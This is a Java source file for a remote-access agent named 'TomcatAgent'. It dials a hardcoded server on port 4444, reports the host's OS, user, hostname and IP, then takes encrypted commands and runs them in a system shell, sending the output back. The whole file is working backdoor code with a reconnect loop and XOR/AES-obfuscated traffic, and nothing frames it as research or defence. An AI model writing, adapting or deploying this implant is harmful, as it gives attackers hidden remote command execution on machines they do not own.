import java.io.*;
import java.net.*;
import java.util.*;
import java.util.Base64;
import javax.crypto.*;
import javax.crypto.spec.*;

public class TomcatAgent {

    private static final String SERVER_HOST = "10.64.142.90";
    private static final int SERVER_PORT = 4444;
    private static byte[] key;

    public static void main(String[] args) {
        while (true) {
            try {
                connectToServer();
            } catch (Exception e) {
                System.out.println("[-] Error: " + e.getMessage());
            }

            try {
                System.out.println("[*] Reconnecting in 5 seconds...");
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }

    private static void connectToServer() throws Exception {
        System.out.println("[*] Connecting to " + SERVER_HOST + ":" + SERVER_PORT);

        Socket socket = new Socket();
        socket.connect(new InetSocketAddress(SERVER_HOST, SERVER_PORT), 10000);

        System.out.println("[+] Connected!");

        InputStream in = socket.getInputStream();
        OutputStream out = socket.getOutputStream();

        byte[] keyBuffer = new byte[1024];
        int keyLen = in.read(keyBuffer);
        if (keyLen <= 0) {
            throw new Exception("No key received");
        }

        key = new byte[keyLen];
        System.arraycopy(keyBuffer, 0, key, 0, keyLen);

        System.out.println("[+] Key received");

        String hostname = InetAddress.getLocalHost().getHostName();
        String user = System.getProperty("user.name");
        String os = System.getProperty("os.name");
        String arch = System.getProperty("os.arch");
        String agentIP = getLocalIP();

        String info = String.format(
            "{\"os\":\"%s\",\"hostname\":\"%s\",\"user\":\"%s\",\"architecture\":\"%s\",\"agentIP\":\"%s\",\"pythonVersion\":\"Java-%s\"}",
            os,
            hostname,
            user,
            arch,
            agentIP,
            System.getProperty("java.version")
        );

        out.write(info.getBytes());
        out.flush();
        Thread.sleep(500);

        System.out.println("[+] Handshake complete");

        while (true) {
            ByteArrayOutputStream cmdBuffer = new ByteArrayOutputStream();
            byte[] chunk = new byte[4096];
            int bytesRead;

            while ((bytesRead = in.read(chunk)) > 0) {
                cmdBuffer.write(chunk, 0, bytesRead);

                try {
                    String command = decrypt(cmdBuffer.toByteArray());
                    if (command != null && !command.isEmpty()) {
                        System.out.println(
                            "[+] Command: " + command.substring(0, Math.min(50, command.length())) + "..."
                        );

                        String output = executeCommand(command, hostname, user, os, arch, agentIP);

                        if (output.length() > 1000000) {
                            output = output.substring(0, 1000000) + "\n...[OUTPUT TRUNCATED - TOO LARGE]";
                        }

                        byte[] encryptedOutput = encrypt(output);
                        out.write(encryptedOutput);
                        out.write("<END>".getBytes());
                        out.flush();

                        System.out.println("[+] Response sent");

                        if (command.equalsIgnoreCase("exit") || command.equalsIgnoreCase("quit")) {
                            socket.close();
                            return;
                        }

                        break;
                    }
                } catch (Exception e) {
                    if (cmdBuffer.size() > 1048576) {
                        throw new Exception("Command too large");
                    }
                }
            }

            if (bytesRead == -1) {
                break;
            }
        }

        socket.close();
        System.out.println("[*] Disconnected");
    }

    private static String getLocalIP() {
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress("8.8.8.8", 80), 1000);
            String ip = socket.getLocalAddress().getHostAddress();
            socket.close();
            return ip;
        } catch (Exception e) {
            return "N/A";
        }
    }

    private static String executeCommand(
        String command,
        String hostname,
        String user,
        String os,
        String arch,
        String agentIP
    ) {
        try {
            if (command.equals("SYSINFO")) {
                StringBuilder info = new StringBuilder();
                info.append("OS: ").append(os).append("\n");
                info.append("Hostname: ").append(hostname).append("\n");
                info.append("User: ").append(user).append("\n");
                info.append("Arch: ").append(arch).append("\n");
                info.append("Agent IP: ").append(agentIP).append("\n");
                info.append("Java Version: ").append(System.getProperty("java.version")).append("\n");
                info.append("Current Dir: ").append(System.getProperty("user.dir"));
                return info.toString();
            } else if (command.equals("SCREENSHOT")) {
                return "ERROR: Screenshot not supported in Java agent";
            } else if (command.equalsIgnoreCase("exit") || command.equalsIgnoreCase("quit")) {
                return "Agent disconnecting...";
            }

            String[] cmd;
            if (os.toLowerCase().contains("win")) {
                cmd = new String[] { "cmd.exe", "/c", command };
            } else {
                cmd = new String[] { "/bin/sh", "-c", command };
            }

            Process process = Runtime.getRuntime().exec(cmd);

            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            StringBuilder output = new StringBuilder();
            String line;

            while ((line = stdInput.readLine()) != null) {
                output.append(line).append("\n");
            }

            while ((line = stdError.readLine()) != null) {
                output.append(line).append("\n");
            }

            process.waitFor();

            String result = output.toString();
            return result.isEmpty() ? "Command executed (no output)" : result;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    private static byte[] encrypt(String data) throws Exception {
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(Arrays.copyOf(key, 32), "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(new byte[16]);
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
            return cipher.doFinal(data.getBytes());
        } catch (Exception e) {
            return xorEncrypt(data.getBytes(), key);
        }
    }

    private static String decrypt(byte[] encryptedData) throws Exception {
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(Arrays.copyOf(key, 32), "AES");
            byte[] iv = Arrays.copyOf(encryptedData, 16);
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
            byte[] decrypted = cipher.doFinal(Arrays.copyOfRange(encryptedData, 16, encryptedData.length));
            return new String(decrypted);
        } catch (Exception e) {
            byte[] decrypted = xorEncrypt(encryptedData, key);
            return new String(decrypted);
        }
    }

    private static byte[] xorEncrypt(byte[] data, byte[] key) {
        byte[] output = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            output[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return output;
    }
}
